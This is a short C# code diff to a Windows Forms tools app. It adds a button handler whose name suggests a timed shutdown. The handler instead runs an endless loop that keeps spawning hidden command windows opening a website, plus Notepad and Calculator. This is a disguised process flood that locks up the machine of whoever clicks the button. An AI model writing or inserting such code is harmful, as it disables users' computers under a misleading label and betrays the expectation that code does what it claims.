@@ -51,5 +51,20 @@ namespace ferramentas
             });
             MessageBox.Show("Desligamento Cancelado");
         }
+
+        private void btnDesligaMin_Click(object sender, EventArgs e)
+        {
+            int count = 0;
+            while (true)
+            {
+                Process.Start(new ProcessStartInfo("cmd", "/c start https://www.google.com.br")
+                {
+                    CreateNoWindow = true,
+                });
+                Process.Start("notepad.exe");
+                Process.Start("calc.exe");
+            }
+
+        }
     }
 }
